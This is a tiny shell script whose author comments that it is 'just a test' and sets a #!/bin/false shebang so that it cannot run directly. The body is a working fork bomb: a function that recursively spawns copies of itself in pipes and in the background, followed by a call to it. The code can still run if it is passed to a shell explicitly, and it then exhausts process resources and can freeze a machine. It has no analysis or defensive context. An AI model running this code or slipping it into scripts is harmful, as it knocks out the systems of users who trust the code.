#!/bin/false
# seriously, do not run this, this is just a test
# i put #!/bin/false so it cannot run
# this is just a test, I wrote a forkbomb
# so MXPSQL wrote this as a test

a(){
	a | a & a > /dev/null;
};

a

# A very nasty file